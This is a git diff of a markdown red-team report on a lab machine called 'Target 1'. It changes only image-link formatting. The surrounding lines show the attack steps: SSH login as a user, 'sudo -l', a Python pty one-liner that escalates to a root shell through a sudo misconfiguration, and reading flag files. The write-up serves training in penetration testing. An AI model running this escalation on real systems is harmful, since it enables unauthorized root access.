@@ -153,7 +153,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
          ssh steven@192.168.1.110
          sudo -l
          ```
-         ![Target1/steven_has_sudo_python_access.JPG](Target1/steven_has_sudo_python_access.JPG)steven_has_sudo_python_access.JPG
+         ![Target1/steven_has_sudo_python_access.JPG](Target1/steven_has_sudo_python_access.JPG)steven_has_sudo_python_access.JPG)
        - Escalated priviledge to root and found flag:
          ```
          sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
@@ -161,4 +161,4 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
          ls
          cat *.txt
          ```
-         ![Target1/flag4_found](Target1/flag4_found.JPG
+         ![Target1/flag4_found](Target1/flag4_found.JPG)
